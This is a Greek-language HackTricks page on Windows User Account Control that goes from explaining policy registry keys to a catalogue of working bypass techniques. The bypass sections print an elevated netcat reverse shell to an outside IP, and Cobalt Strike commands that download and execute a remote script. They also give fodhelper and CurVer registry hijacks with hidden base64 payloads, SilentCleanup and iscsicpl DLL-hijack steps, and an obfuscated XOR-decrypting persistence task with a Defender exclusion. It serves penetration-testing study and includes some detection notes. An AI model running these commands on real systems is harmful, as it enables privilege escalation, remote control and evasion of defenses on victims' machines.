# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

Το [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια δυνατότητα που ενεργοποιεί ένα **μήνυμα συναίνεσης για ενέργειες με αυξημένα δικαιώματα**. Οι εφαρμογές έχουν διαφορετικά επίπεδα `integrity` και ένα πρόγραμμα με **υψηλό επίπεδο** μπορεί να εκτελέσει εργασίες που **θα μπορούσαν δυνητικά να θέσουν σε κίνδυνο το σύστημα**. Όταν το UAC είναι ενεργοποιημένο, οι εφαρμογές και οι εργασίες **εκτελούνται πάντα στο πλαίσιο ασφαλείας ενός λογαριασμού που δεν είναι administrator**, εκτός αν ένας administrator εξουσιοδοτήσει ρητά αυτές τις εφαρμογές/εργασίες να αποκτήσουν πρόσβαση επιπέδου administrator στο σύστημα για να εκτελεστούν. Είναι μια δυνατότητα ευκολίας που προστατεύει τους administrators από ακούσιες αλλαγές, αλλά δεν θεωρείται security boundary.<sup>[[2]](#references)</sup>

Για περισσότερες πληροφορίες σχετικά με τα επίπεδα integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Όταν το UAC είναι ενεργοποιημένο, σε έναν χρήστη administrator εκχωρούνται 2 tokens: ένα token standard user, για την εκτέλεση κανονικών ενεργειών σε medium integrity, και ένα με τα admin privileges.

Αυτή η [σελίδα](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) αναλύει σε μεγάλο βάθος τον τρόπο λειτουργίας του UAC και περιλαμβάνει τη διαδικασία logon, την εμπειρία χρήστη και την αρχιτεκτονική του UAC.<sup>[[2]](#references)</sup> Οι administrators μπορούν να χρησιμοποιούν security policies για να ρυθμίζουν τον τρόπο λειτουργίας του UAC σύμφωνα με τις ανάγκες του οργανισμού τους σε τοπικό επίπεδο (χρησιμοποιώντας το secpol.msc) ή να τις ρυθμίζουν και να τις προωθούν μέσω Group Policy Objects (GPO) σε περιβάλλον domain Active Directory. Οι διάφορες ρυθμίσεις αναλύονται λεπτομερώς [εδώ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Υπάρχουν 10 ρυθμίσεις Group Policy που μπορούν να οριστούν για το UAC. Ο παρακάτω πίνακας παρέχει πρόσθετες λεπτομέρειες:

| Ρύθμιση Group Policy                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Προεπιλεγμένη ρύθμιση                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Απενεργοποιημένο)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Μήνυμα συναίνεσης για non-Windows binaries στο secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Μήνυμα για credentials στο secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Ενεργοποιημένο· απενεργοποιημένο από προεπιλογή στην Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Απενεργοποιημένο)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Ενεργοποιημένο)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Ενεργοποιημένο)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Απενεργοποιημένο)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Ενεργοποιημένο)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Ενεργοποιημένο)                                              |

### Policies για την εγκατάσταση software στα Windows

Οι **τοπικές security policies** ("secpol.msc" στα περισσότερα συστήματα) είναι ρυθμισμένες από προεπιλογή ώστε να **αποτρέπουν τους χρήστες που δεν είναι administrators από την εκτέλεση εγκαταστάσεων software**. Αυτό σημαίνει ότι, ακόμη και αν ένας χρήστης που δεν είναι administrator μπορεί να κατεβάσει τον installer του software σας, δεν θα μπορεί να τον εκτελέσει χωρίς λογαριασμό administrator.

### Registry Keys για την υποχρεωτική εμφάνιση ερωτήματος ανύψωσης από το UAC

Ως standard user χωρίς admin rights, μπορείτε να διασφαλίσετε ότι ο "standard" λογαριασμός θα **κληθεί να εισαγάγει credentials από το UAC** όταν επιχειρεί να εκτελέσει συγκεκριμένες ενέργειες. Αυτή η ενέργεια απαιτεί την τροποποίηση ορισμένων **registry keys**, για τα οποία χρειάζεστε admin permissions, εκτός αν υπάρχει **UAC bypass** ή ο attacker είναι ήδη συνδεδεμένος ως administrator.

Ακόμη και αν ο χρήστης ανήκει στην ομάδα **Administrators**, αυτές οι αλλαγές υποχρεώνουν τον χρήστη να **εισαγάγει ξανά τα credentials του λογαριασμού του** για να εκτελέσει administrative actions.

**Στην πράξη, αυτό είναι χρήσιμο μόνο όταν έχετε ήδη ένα elevated token, ένα UAC bypass ή μια misconfiguration που σας επιτρέπει να αλλάξετε αυτά τα keys· διαφορετικά, η ίδια η εγγραφή στο registry αποκλείεται.**

Τα registry keys και οι entries που πρέπει να αλλάξετε είναι τα εξής (με τις προεπιλεγμένες τιμές τους σε παρένθεση):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Αυτό μπορεί επίσης να γίνει χειροκίνητα μέσω του εργαλείου Local Security Policy. Μόλις αλλάξουν, οι administrative operations ζητούν από τον χρήστη να εισαγάγει ξανά τα credentials του.

### Σημείωση

**Το User Account Control δεν είναι security boundary.** Επομένως, οι standard users δεν μπορούν να ξεφύγουν από τους λογαριασμούς τους και να αποκτήσουν δικαιώματα administrator χωρίς ένα local privilege escalation exploit.

### Ζητήστε «πλήρη πρόσβαση στον υπολογιστή» από έναν χρήστη
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Προνομία UAC

- Η λειτουργία Protected Mode του Internet Explorer χρησιμοποιεί ελέγχους ακεραιότητας για να αποτρέπει την πρόσβαση διεργασιών υψηλού επιπέδου ακεραιότητας (όπως τα web browsers) σε δεδομένα χαμηλού επιπέδου ακεραιότητας (όπως ο φάκελος προσωρινών αρχείων Internet). Αυτό επιτυγχάνεται με την εκτέλεση του browser με token χαμηλής ακεραιότητας. Όταν ο browser προσπαθεί να αποκτήσει πρόσβαση σε δεδομένα που είναι αποθηκευμένα στη ζώνη χαμηλής ακεραιότητας, το λειτουργικό σύστημα ελέγχει το επίπεδο ακεραιότητας της διεργασίας και επιτρέπει την πρόσβαση ανάλογα. Αυτή η λειτουργία συμβάλλει στην αποτροπή επιθέσεων απομακρυσμένης εκτέλεσης κώδικα από το να αποκτήσουν πρόσβαση σε ευαίσθητα δεδομένα του συστήματος.
- Όταν ένας χρήστης συνδέεται στα Windows, το σύστημα δημιουργεί ένα access token που περιέχει μια λίστα με τα προνόμια του χρήστη. Τα προνόμια ορίζονται ως ο συνδυασμός των δικαιωμάτων και των δυνατοτήτων ενός χρήστη. Το token περιέχει επίσης μια λίστα με τα credentials του χρήστη, δηλαδή τα credentials που χρησιμοποιούνται για την authentication του χρήστη στον υπολογιστή και σε πόρους του δικτύου.

### Autoadminlogon

Για να ρυθμίσετε τα Windows ώστε να συνδέουν αυτόματα έναν συγκεκριμένο χρήστη κατά την εκκίνηση, ορίστε το **`AutoAdminLogon` registry key**. Αυτό είναι χρήσιμο σε περιβάλλοντα kiosk ή για σκοπούς testing. Χρησιμοποιήστε το μόνο σε ασφαλή συστήματα, καθώς εκθέτει το password στο registry.

Ορίστε τα ακόλουθα keys χρησιμοποιώντας τον Registry Editor ή το `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Για να επαναφέρετε τη φυσιολογική συμπεριφορά σύνδεσης, ορίστε το `AutoAdminLogon` σε 0.

## UAC bypass

> [!TIP]
> Σημειώστε ότι αν έχετε graphical access στο victim, το UAC bypass είναι straightforward, καθώς μπορείτε απλώς να κάνετε κλικ στο "Yes" όταν εμφανιστεί το UAC prompt

Το UAC bypass απαιτείται στην ακόλουθη περίπτωση: **το UAC είναι ενεργοποιημένο, η διεργασία σας εκτελείται σε context μέτριας ακεραιότητας και ο χρήστης σας ανήκει στο administrators group**.

Είναι σημαντικό να αναφερθεί ότι είναι **πολύ δυσκολότερο να γίνει bypass του UAC όταν βρίσκεται στο υψηλότερο επίπεδο ασφάλειας (Always) απ' ό,τι όταν βρίσκεται σε οποιοδήποτε από τα άλλα επίπεδα (Default).**

### Fast triage από shell μέτριας ακεραιότητας

Πριν επιχειρήσετε ένα bypass, επιβεβαιώστε ότι βρίσκεστε στο σωστό σενάριο και αντιστοιχίστε το host build με γνωστές λειτουργικές μεθόδους:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Πρακτικές σημειώσεις:
- Αν το `EnableLUA=0`, δεν χρειάζεστε bypass: οποιοδήποτε admin token μπορεί να ζητήσει απευθείας high integrity.
- Το `ConsentPromptBehaviorAdmin=2` ή `5` είναι το συνηθισμένο σενάριο για auto-elevate / COM-based bypasses.
- Το `Always Notify` αυξάνει το επίπεδο δυσκολίας, αλλά θα πρέπει και πάλι να δοκιμάσετε το ακριβές build αντί να υποθέσετε αποτυχία: το UACME εξακολουθεί να καταγράφει ορισμένες μεθόδους `AlwaysNotify compatible` σε σύγχρονα Windows builds.<sup>[[3]](#references)</sup>

### Το UAC είναι απενεργοποιημένο

Αν το UAC είναι ήδη απενεργοποιημένο (το `ConsentPromptBehaviorAdmin` είναι **`0`), μπορείτε να **εκτελέσετε ένα reverse shell με admin privileges** (high integrity level) χρησιμοποιώντας κάτι όπως:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass με token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Πολύ** βασικό UAC "bypass" (πλήρης πρόσβαση στο file system)

Αν έχετε ένα shell με έναν user που ανήκει στο group Administrators, μπορείτε να κάνετε **mount το C$** shared μέσω SMB (file system) τοπικά σε έναν νέο δίσκο και θα έχετε **πρόσβαση σε ολόκληρο το file system** (ακόμη και στον home folder του Administrator).

> [!WARNING]
> **Φαίνεται ότι αυτό το trick δεν λειτουργεί πλέον**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass με Cobalt Strike

Οι τεχνικές του Cobalt Strike λειτουργούν μόνο αν το UAC δεν έχει ρυθμιστεί στο μέγιστο επίπεδο ασφαλείας
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** και **Metasploit** διαθέτουν επίσης αρκετά modules για **bypass** του **UAC**.

### Ανυψωμένες διεπαφές COM (`ICMLuaUtil` / `CMSTPLUA`)

Τα COM objects με αυτόματη ανύψωση παραμένουν μια πρακτική επιφάνεια UAC σε σύγχρονες εκδόσεις. Το `ICMLuaUtil` εξακολουθεί να καταγράφεται από το UACME ως λειτουργικό στις τρέχουσες εκδόσεις των Windows, ενώ τα offensive εργαλεία συνεχίζουν να προσαρμόζουν το `CMSTPLUA`, συνδυάζοντας μια διεργασία στο interactive desktop, εκτέλεση 64-bit και, μερικές φορές, PEB/process masquerading πριν από την κλήση του COM Elevation Moniker.<sup>[[3]](#references)</sup>

Πρακτικές συμβουλές:
- Προτιμήστε μια **64-bit** διεργασία στο **interactive session** του χρήστη (συνήθως το `explorer.exe` ή ένα child process του).
- Αν ένα raw shell αποτύχει, δοκιμάστε ξανά από ένα BOF / implementation του UACME αντί για ένα απλοϊκό wrapper του `CreateProcess`.
- Αναμένετε η εκτέλεση του child process να πραγματοποιηθεί σε **ξεχωριστή elevated διεργασία**· πολλά BOFs δεν κάνουν elevate το τρέχον beacon in-place.

### KRBUACBypass

Documentation και tool στο [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

Το [**UACME**](https://github.com/hfiref0x/UACME) είναι μια συλλογή από τεχνικές UAC bypass. Κάντε compile με Visual Studio ή MSBuild· το build δημιουργεί αρκετά executables (για παράδειγμα, `Source\Akagi\output\x64\Debug\Akagi.exe`), επομένως επιλέξτε τη μέθοδο που είναι κατάλληλη για το target build.<sup>[[3]](#references)</sup>\
Προσοχή: ορισμένα bypasses εκκινούν ορατά προγράμματα ή prompts που μπορούν να ειδοποιήσουν τον χρήστη.<sup>[[3]](#references)</sup>

Το UACME διαθέτει την **build version από την οποία άρχισε να λειτουργεί κάθε τεχνική**.<sup>[[3]](#references)</sup> Μπορείτε να αναζητήσετε μια τεχνική που επηρεάζει τις εκδόσεις σας:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Επίσης, χρησιμοποιώντας [αυτή τη](https://en.wikipedia.org/wiki/Windows_10_version_history) σελίδα, βρίσκετε την έκδοση Windows `1607` από τις εκδόσεις build.

Μια πρακτική ροή εργασίας είναι να **αξιολογήσετε πρώτα το build του host** και μόνο έπειτα να εκτελέσετε την αντίστοιχη μέθοδο:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- Το `WinPwnage` συγκρίνει γρήγορα το τοπικό build με τις γνωστές μεθόδους UAC, κάτι χρήσιμο για τη γρήγορη απόρριψη μη λειτουργικών PoC.<sup>[[4]](#references)</sup>
- Το `UACME` παραμένει ο καλύτερος δημόσιος κατάλογος για την αντιστοίχιση ενός bypass με ένα συγκεκριμένο build. Οι πρόσφατες εκδόσεις πρόσθεσαν νέες μεθόδους και επανέλεγξαν τις υπάρχουσες σε **Windows 11 25H2**, επομένως ελέγξτε ξανά το README και τις release notes πριν θεωρήσετε ότι μια παλιά ανάρτηση ιστολογίου εξακολουθεί να ισχύει χωρίς αλλαγές.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (παραβίαση Registry)

Το αξιόπιστο binary `fodhelper.exe` εκτελείται αυτόματα με αυξημένα δικαιώματα σε σύγχρονα Windows. Κατά την εκκίνησή του, αναζητά την παρακάτω per-user διαδρομή Registry χωρίς να επικυρώνει το verb `DelegateExecute`. Η τοποθέτηση μιας εντολής εκεί επιτρέπει σε μια διεργασία Medium Integrity (ο χρήστης ανήκει στην ομάδα Administrators) να εκκινήσει μια διεργασία High Integrity χωρίς προτροπή UAC.

Διαδρομή Registry που αναζητά το fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Βήματα PowerShell (ορίστε το payload σας και, στη συνέχεια, ενεργοποιήστε το)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Σημειώσεις:
- Λειτουργεί όταν ο τρέχων χρήστης είναι μέλος των Administrators και το επίπεδο του UAC είναι default/lenient (όχι Always Notify με επιπλέον περιορισμούς).
- Χρησιμοποιήστε τη διαδρομή `sysnative` για να εκκινήσετε ένα 64-bit PowerShell από μια 32-bit διεργασία σε Windows 64-bit.
- Το Payload μπορεί να είναι οποιαδήποτε εντολή (PowerShell, cmd ή διαδρομή προς ένα EXE). Αποφύγετε τα UIs που εμφανίζουν prompts για stealth.

#### Παραλλαγή CurVer/extension hijack (μόνο HKCU)

Πρόσφατα samples που κάνουν abuse του `fodhelper.exe` αποφεύγουν το `DelegateExecute` και αντ' αυτού **ανακατευθύνουν το `ms-settings` ProgID** μέσω της τιμής `CurVer` ανά χρήστη. Το auto-elevated binary εξακολουθεί να επιλύει τον handler υπό το `HKCU`, επομένως δεν απαιτείται admin token για την τοποθέτηση των keys:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Μόλις αποκτήσει elevated δικαιώματα, το malware συνήθως **απενεργοποιεί τις μελλοντικές prompts** ορίζοντας το `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` σε `0` και, στη συνέχεια, εκτελεί επιπλέον defense evasion (π.χ. `Add-MpPreference -ExclusionPath C:\ProgramData`) και αναδημιουργεί το persistence ώστε να εκτελείται με high integrity. Μια τυπική persistence task αποθηκεύει στον δίσκο ένα **XOR-encrypted PowerShell script** και το αποκωδικοποιεί/εκτελεί in-memory κάθε ώρα:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Αυτή η παραλλαγή εξακολουθεί να καθαρίζει το dropper και να αφήνει μόνο τα staged payloads, με αποτέλεσμα η ανίχνευση να βασίζεται στην παρακολούθηση του **`CurVer` hijack**, της παραποίησης του `ConsentPromptBehaviorAdmin`, της δημιουργίας εξαίρεσης στο Defender ή των scheduled tasks που κάνουν in-memory decrypt του PowerShell.<sup>[[5]](#references)</sup>

### Παράκαμψη UAC μέσω του `SilentCleanup` task (`HKCU\Environment\windir`)

Το `SilentCleanup` εκκινεί το `cleanmgr.exe` με τα υψηλότερα privileges και κάνει expand το `%windir%` από το user environment. Αν ελέγχετε το `HKCU\Environment\windir`, μπορείτε να ανακατευθύνετε αυτό το expansion σε μια αυθαίρετη εντολή και να αποκτήσετε high integrity χωρίς consent dialog.<sup>[[8]](#references)</sup> Αυτή η μέθοδος εξακολουθεί να αξίζει testing σε πρόσφατα builds, επειδή το UACME διατηρεί την τεχνική ενεργή και το πρόσφατο issue tracking δείχνει ότι τα Windows 11 24H2 ενδέχεται να απαιτούν μόνο μικρές προσαρμογές στο quoting.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Εάν η εργασία αναφέρει το path σε εκείνο το build, επαναλάβετε με το payload να τελειώνει σε quote (για παράδειγμα `cmd.exe"`). Καθαρίζετε πάντα το `HKCU\Environment\windir` μετά τη δοκιμή.

#### Περισσότερα UAC bypass

Πολλά κλασικά UAC bypasses που κάνουν abuse σε UI flows, COM objects ή desktop interaction απαιτούν μια **full interactive session** με το θύμα. Ένα συνηθισμένο shell μέσω `nc.exe` ή ένα service που εκτελείται στο **Session 0** συχνά δεν επαρκεί.

Μπορείτε συχνά να το επιλύσετε χρησιμοποιώντας μια **meterpreter** session. Κάντε migrate σε ένα **process** που έχει την τιμή **Session** ίση με **1**:

![Point ms-settings to a custom extension (.thm) and map that extension to our payload - Περισσότερα UAC bypass: Μπορείτε να το επιτύχετε χρησιμοποιώντας μια meterpreter session. Κάντε migrate σε ένα process που έχει το Session...](<../../images/image (863).png>)

(_Το _explorer.exe_ θα πρέπει να λειτουργεί_)

### UAC Bypass με GUI

Εάν έχετε πρόσβαση σε **GUI**, μπορείτε απλώς να αποδεχτείτε το UAC prompt όταν εμφανιστεί· επομένως, δεν χρειάζεστε πραγματικά ένα technical bypass. Συνεπώς, η απόκτηση μιας GUI session συχνά αρκεί για να παρακάμψετε την πρακτική τριβή που προσθέτει το UAC.

Επιπλέον, εάν αποκτήσετε μια GUI session που χρησιμοποιούσε κάποιος (ενδεχομένως μέσω RDP), θα υπάρχουν **ορισμένα εργαλεία που θα εκτελούνται ως administrator**, από τα οποία θα μπορούσατε να **εκτελέσετε** για παράδειγμα ένα **cmd** **ως admin** απευθείας, χωρίς να εμφανιστεί ξανά UAC prompt, όπως το [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Αυτό μπορεί να είναι λίγο πιο **stealthy**.

### Θορυβώδες brute-force UAC bypass

Εάν ο θόρυβος είναι αποδεκτός, ένα εργαλείο όπως το [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) μπορεί να ζητά επανειλημμένα elevation μέχρι ο χρήστης να το αποδεχτεί.

### Το δικό σας bypass - Βασική μεθοδολογία UAC bypass

Εάν εξετάσετε το **UACME**, θα παρατηρήσετε ότι **πολλά UAC bypasses κάνουν abuse σε DLL hijacking** (συχνά κάνοντας ένα elevated binary να φορτώσει ένα attacker-controlled DLL από ένα writable path). [Διαβάστε αυτό για να μάθετε πώς να εντοπίζετε μια ευπάθεια DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Βρείτε ένα binary που κάνει **autoelevate** (ελέγξτε ότι κατά την εκτέλεσή του εκτελείται σε high integrity level).
2. Με το procmon, βρείτε events "**NAME NOT FOUND**" που μπορεί να είναι ευάλωτα σε **DLL Hijacking**.
3. Πιθανότατα θα χρειαστεί να **γράψετε** το DLL μέσα σε κάποια **protected paths** (όπως το C:\Windows\System32), όπου δεν έχετε δικαιώματα εγγραφής. Μπορείτε να το παρακάμψετε χρησιμοποιώντας:
1. **wusa.exe**: Windows 7,8 και 8.1. Σας επιτρέπει να εξαγάγετε το περιεχόμενο ενός αρχείου CAB μέσα σε protected paths (επειδή αυτό το εργαλείο εκτελείται από high integrity level).
2. **IFileOperation**: Windows 10.
4. Προετοιμάστε ένα **script** για να αντιγράψετε το DLL μέσα στο protected path και να εκτελέσετε το ευάλωτο και autoelevated binary.

### Μια άλλη τεχνική UAC bypass

Συνίσταται στην παρακολούθηση του εάν ένα **autoElevated binary** προσπαθεί να **διαβάσει** από το **registry** το **όνομα/path** ενός **binary** ή μιας **command** που πρόκειται να **εκτελεστεί** (αυτό είναι πιο ενδιαφέρον εάν το binary αναζητά αυτές τις πληροφορίες μέσα στο **HKCU**).

### UAC bypass μέσω `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

Το 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` είναι ένα **auto-elevated** binary που μπορεί να γίνει abuse ώστε να φορτώσει το `iscsiexe.dll` μέσω search order. Εάν μπορείτε να τοποθετήσετε ένα malicious `iscsiexe.dll` μέσα σε έναν **user-writable** φάκελο και στη συνέχεια να τροποποιήσετε το `PATH` του current user (για παράδειγμα μέσω του `HKCU\Environment\Path`), ώστε να γίνεται αναζήτηση σε αυτόν τον φάκελο, τα Windows ενδέχεται να φορτώσουν το attacker DLL μέσα στο elevated process του `iscsicpl.exe` **χωρίς να εμφανίσουν UAC prompt**.<sup>[[1]](#references)[[6]](#references)</sup>

Πρακτικές σημειώσεις:
- Αυτό είναι χρήσιμο όταν ο current user ανήκει στους **Administrators**, αλλά εκτελείται σε **Medium Integrity** λόγω του UAC.
- Το αντίγραφο του **SysWOW64** είναι το σχετικό για αυτό το bypass. Αντιμετωπίστε το αντίγραφο του **System32** ως ξεχωριστό binary και επικυρώστε τη συμπεριφορά του ανεξάρτητα.
- Το primitive είναι ένας συνδυασμός **auto-elevation** και **DLL search-order hijacking**, επομένως το ίδιο ProcMon workflow που χρησιμοποιείται για άλλα UAC bypasses είναι χρήσιμο για την επικύρωση του missing DLL load.

Ελάχιστη ροή:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ιδέες ανίχνευσης:
- Ειδοποίηση για `reg add` / εγγραφές στο registry στο `HKCU\Environment\Path` που ακολουθούνται άμεσα από την εκτέλεση του `C:\Windows\SysWOW64\iscsicpl.exe`.
